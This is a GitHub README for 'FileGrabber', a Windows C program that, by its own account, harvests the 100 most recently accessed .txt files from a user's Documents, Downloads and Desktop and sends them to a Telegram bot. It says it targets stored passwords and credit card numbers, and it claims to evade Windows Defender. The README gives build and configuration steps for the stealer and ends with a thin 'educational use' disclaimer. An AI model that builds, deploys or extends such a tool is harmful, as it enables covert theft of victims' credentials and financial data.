# FileGrabber
<img src="https://raw.githubusercontent.com/vicious991/filegrabber/main/filegrabber.png" width="300" />

A Windows utility that automatically scans for recently accessed `.txt` files, compresses them into a zip archive, and sends them to your Telegram bot.

Derived from people's habit of storing passwords and other confidential data like credit card number in a text file on desktop.

## ⭐Features

- 🔍 Scans common Windows directories (Documents, Downloads, Desktop)
- 📁 Finds the 100 most recently accessed `.txt` files
- 📦 Compresses files into a single zip archive
- 📤 Automatically Exfiltrate the archive to your Telegram bot
- 🧹 Cleans up temporary files after sending
- 🔧 Easy-to-use builder for configuration
- 🔍 Successfully evades Windows Defender

## 📝Prerequisites

- **Windows OS** (uses PowerShell for compression and file transfer)
- **GCC Compiler** (MinGW-w64 or TDM-GCC)
- **Telegram Bot Token** and **Chat ID**

### Installing GCC on Windows

Choose one of the following:

- [MinGW-w64](https://www.mingw-w64.org/)
- [TDM-GCC](https://jmeubank.github.io/tdm-gcc/)

Make sure `gcc` is added to your system PATH.

## Getting Your Telegram Credentials

### 1. 🤖Create a Telegram Bot

1. Open Telegram and search for [@BotFather](https://t.me/botfather)
2. Send `/newbot` and follow the instructions
3. Copy the **Bot Token** (format: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 2. 💬Get Your Chat ID

1. Search for [@userinfobot](https://t.me/userinfobot) on Telegram
2. Start a chat with it
3. Copy your **Chat ID** (a numeric value like `123456789`)

## 👀Installation & Usage

### Method 1: Using the Builder (Recommended)

1. **Clone the repository:**
```bash
   git clone https://github.com/vicious991/filegrabber.git
   cd filegrabber
```

2. **Compile the builder:**
```bash
   gcc -o builder.exe builder.c
```

3. **Run the builder:**
```bash
   builder.exe
```

4. **Enter your credentials** when prompted:
   - Telegram Bot Token
   - Telegram Chat ID

5. **The builder will automatically:**
   - Generate a configured source file
   - Compile the final executable
   - Create `filegrabber.exe`

6. **Run the program:**
```bash
   filegrabber.exe
```

### Method 2: Manual Configuration

1. **Edit `filegrabber.c`:**
```c
   #define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
   #define CHAT_ID "YOUR_CHAT_ID_HERE"
```

2. **Compile:**
```bash
   gcc -o filegrabber.exe filegrabber.c -O2 -s
```

3. **Run:**
```bash
   filegrabber.exe
```

## ☠How It Works

1. **Scanning:** The program recursively scans:
   - `%USERPROFILE%\Documents`
   - `%USERPROFILE%\Downloads`
   - `%USERPROFILE%\Desktop`
   - Current directory

2. **Filtering:** Only `.txt` files are selected

3. **Sorting:** Files are sorted by last access time (most recent first)

4. **Compression:** Top 100 files are compressed into `recent_files.zip` using PowerShell's `Compress-Archive`

5. **Upload:** The zip file is sent to your Telegram bot via the Telegram Bot API

6. **Cleanup:** Temporary files are removed after successful upload

## Configuration Options

You can modify these constants in `filegrabber.c`:
```c
#define MAX_FILES 100        // Maximum number of files to include
#define MAX_PATH 1024        // Maximum path length
```

## File Structure
```
filegrabber/
├── filegrabber.c              # Main program source
├── builder.c                  # Configuration builder
├── README.md                  # This file
```

## 🔒Security Considerations

- ⚠️ **Bot Token Security:** The bot token is embedded in the compiled executable. Keep the executable secure and don't share it publicly.
- ⚠️ **Source Code:** Delete `filegrabber_configured.c` after building to prevent exposing your credentials.
- ⚠️ **File Access:** The program only reads files; it doesn't modify or delete them (except temporary zip files).
- ⚠️ **Privacy:** Be aware that this tool sends file contents to Telegram. Only use it with files you're comfortable uploading.

## Troubleshooting

### "GCC compiler not found"
- Make sure GCC is installed and added to your PATH
- Restart your terminal after installing GCC

### "Failed to create zip file"
- Run PowerShell as administrator
- Check if the files are accessible and not locked by other programs

### "Error sending file to Telegram"
- Verify your Bot Token and Chat ID are correct
- Check your internet connection
- Make sure the bot has permission to send messages to your chat
- File size limit: Telegram bots can send files up to 50 MB

### "No .txt files found"
- Make sure you have `.txt` files in the scanned directories
- Check file permissions

## Limitations

- **Windows Only:** Uses Windows-specific paths and PowerShell
- **File Type:** Currently only supports `.txt` files
- **File Limit:** Limited to 100 most recent files
- **Size Limit:** Telegram has a 50 MB file size limit for bot uploads


## Disclaimer

This tool is provided for educational and personal use only. Users are responsible for ensuring they have the right to access and transmit any files processed by this program. Always respect privacy and data protection laws.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Author

Created by - Vicious (linkedin : www.linkedin.com/in/sai-timande01)

## Donate ❤
https://ko-fi.com/saitimande

---

**Note:** This is a utility tool. Use responsibly and only on files you own or have permission to access.
